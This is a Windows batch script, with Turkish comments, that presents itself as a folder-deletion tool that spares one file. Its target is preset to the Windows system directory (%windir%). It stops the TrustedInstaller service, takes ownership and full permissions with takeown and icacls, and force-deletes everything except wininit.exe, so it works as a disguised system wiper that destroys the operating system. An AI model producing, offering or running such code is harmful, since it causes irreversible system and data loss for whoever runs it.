@echo off
setlocal EnableDelayedExpansion
title Belirli Dosyayi Koruyarak Silme Araci
color 0A

:: Yonetici yetkisi kontrolu
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] HATA: Administrator yetkisi gerekli!
    echo [!] Lutfen bu dosyayi yonetici olarak calistirin.
    pause
    exit /B 1
)

:: Silinecek klasorun tam yolunu buraya yazin
set "targetPath=%windir%"
set "protectedFile=wininit.exe"

echo [+] Silme islemi basliyor...
echo [+] Hedef: %targetPath%
echo [+] Korunan dosya: %protectedFile%
echo.

:: TrustedInstaller servisini durdur
echo [*] TrustedInstaller servisi durduruluyor...
net stop TrustedInstaller /y >nul 2>&1

:: Sistem yetkilerini kaldir
echo [*] Sistem yetkileri kaldiriliyor...
icacls "%targetPath%" /setowner "Administrators" /T /C >nul 2>&1
icacls "%targetPath%" /reset /T >nul 2>&1

:: Tum yetkileri al
echo [*] Tum yetkiler aliniyor...
takeown /F "%targetPath%" /A /R /D Y >nul 2>&1
icacls "%targetPath%" /grant:r Administrators:F /T /C /Q >nul 2>&1
icacls "%targetPath%" /grant:r %username%:F /T /C /Q >nul 2>&1

:: Dosya ve klasorleri silme
echo [*] Dosyalar ve klasorler siliniyor (korunan dosya haric)...
for /f "delims=" %%i in ('dir /b /a "%targetPath%"') do (
    if /i not "%%i"=="%protectedFile%" (
        echo [*] Siliniyor: %%i
        rd /s /q "%targetPath%\%%i" 2>nul
        del /f /q "%targetPath%\%%i" 2>nul
    ) else (
        echo [!] Korunuyor: %%i
    )
)

:: Son kontrol
if exist "%targetPath%" (
    echo.
    echo [+] Islemler tamamlandi. Korunan dosya: %protectedFile%
    echo.
) else (
    echo.
    echo [!] HATA: Hedef klasor tamamen silindi!
    echo.
)

:: TrustedInstaller servisini yeniden baslat
echo [*] TrustedInstaller servisi yeniden baslatiliyor...
net start TrustedInstaller >nul 2>&1

pause
exit /B 0
